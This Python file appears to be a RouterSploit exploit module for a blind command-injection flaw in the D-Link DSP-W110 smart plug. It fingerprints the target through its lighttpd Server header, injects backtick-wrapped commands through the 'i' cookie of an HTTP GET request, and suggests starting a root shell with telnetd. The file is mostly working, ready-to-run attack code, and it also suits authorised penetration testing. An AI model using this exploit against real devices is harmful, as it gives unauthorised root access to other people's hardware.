from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "D-Link DSP-W110 RCE",
        "description": "Module exploits D-Link DSP-W110 Remote Command Execution vulnerability "
                       "which allows executing command on the operating system level.",
        "authors": (
            "Peter Adkins <peter.adkins[at]kernelpicnic.net",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "https://github.com/darkarnium/secpub/tree/master/D-Link/DSP-W110",
        ),
        "devices": (
            "D-Link DSP-W110 (Rev A) - v1.05b01",
        )
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        if self.check():
            print_status("Target might be vulnerable - difficult to verify")
            print_status("Invoking command loop...")
            print_status("It is blind command injection, response is not available.")
            print_status("Spawn root shell with telnetd -l/bin/sh")
            shell(self, architecture="mipsbe")
        else:
            print_error("Exploit failed - target seems to be not vulnerable")

    def execute(self, cmd):
        if len(cmd) > 18:
            print_error("Command too long. Max is 18 characters.")
            return ""

        payload = "`{}`".format(cmd)
        cookies = {"i": payload}

        self.http_request(
            method="GET",
            path="/",
            cookies=cookies
        )
        return ""

    @mute
    def check(self):
        response = self.http_request(
            method="GET",
            path="/"
        )
        if response is not None and "Server" in response.headers.keys() and "lighttpd/1.4.34" in response.headers['Server']:
            return True  # target is vulnerable

        return False
